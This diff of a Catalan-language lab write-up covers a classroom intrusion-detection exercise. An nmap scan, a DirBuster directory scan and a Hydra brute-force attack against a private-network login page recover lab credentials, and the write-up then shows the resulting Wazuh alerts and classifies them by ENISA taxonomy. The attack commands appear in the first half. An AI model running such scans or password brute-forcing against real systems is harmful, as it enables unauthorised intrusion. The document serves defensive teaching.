@@ -1,18 +1,18 @@
-Workshop 1 - Montilivi 192.168.1.49
-Workshop 2 - DC1 192.168.1.170
-Workshop 3 - DC4 192.168.1.41
-Wazuh Manager 192.168.1.80
-
-
-
 Màquines:
+
 ● Víctima: 192.168.1.41
-Aquesta màquina té el Wazuh agent enviant alertes al manager.
+
+  Aquesta màquina té el Wazuh agent enviant alertes al manager.
+
 ● Wazuh manager: 192.168.1.80
 
 Atac:
+
 Investiga quins ports té oberts la víctima:
+
+```
 nmap -sV -sT -O -A -p- 192.168.1.41
+```
 
 ```
 └──╼ $ping 192.168.1.41
@@ -29,11 +29,16 @@ PING 192.168.1.41 (192.168.1.41) 56(84) bytes of data.
 
 OWASP Dirbuster 1.0-RC1 - Web Application Brute Forcing
 
+!["OWASP DirBuster"](images/image01.png "OWASP DirBuster")
+
+!["OWASP DirBuster"](images/image02.png "OWASP DirBuster")
 
 
 http://192.168.1.41/login.php
 
-Request headers
+!["Request"](images/image03.png "Request")
+
+Request headers:
 
 ```
 Host: 192.168.1.41
@@ -50,12 +55,15 @@ Referer: http://192.168.1.41/
 Upgrade-Insecure-Requests: 1
 ```
 
+Request body:
+
 ```
 username=toni&password=toni
 ```
 
-
+```
 └──╼ $hydra -l admin -P /usr/share/wordlists/dirb/others/best1050.txt 192.168.1.41 http-post-form "/login.php:username=^USER^&password=^PASS^:invalid"
+
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-22 17:26:49
@@ -64,7 +72,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-22 17:26:
 [80][http-post-form] host: 192.168.1.41   login: admin   password: happy
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-22 17:27:06
-
+```
 
 ```
 login: admin   
@@ -84,6 +92,16 @@ wlp14s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
 ```
+
+Aquest atac genera una alerta al Wazuh manager per cada intent fallit.
+
+● Mostra aquesta alerta amb una captura.
+
+!["Wazuh Security Events - Dashboard"](images/image04.png "Wazuh Security Events - Dashboard")
+
+!["Wazuh Security Events"](images/image05.png "Wazuh Security Events")
+
+!["Wazuh Event Info"](images/image06.png "Wazuh Event Info")
 
 ```
 {
@@ -151,13 +169,20 @@ wlp14s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 }
 ```
 
+● Anomena a quina taxonomia pertany aquest incident i fes-ne una breu explicació .
+(https://github.com/enisaeu/Reference-Security-Incident-Taxonomy-Task-Force/blob/master/working_copy/humanv1.md)
+
+Intrusion Attempts, Login Attempts
+Diversos intents d'inici de sessió de força bruta (incloent endevinar o trencar contrasenyes). Aquest COI es refereix a un recurs, que s'ha observat per realitzar atacs de força bruta sobre un protocol d'aplicació donat.
 
 ● A quin fitxer log de la màquina víctima s’ha enregistrat l’alerta enviada al Wazuh?
+
 ```
 /var/log/nginx/access.log
 ```
 
 ● Quin és el missatge de l’alerta que ens permet identificar l’incident?
+
 ```
 192.168.1.224 - - [23/Mar/2022:02:30:44 +1000] "HEAD //images/alumni.php HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)" "-"
 ```
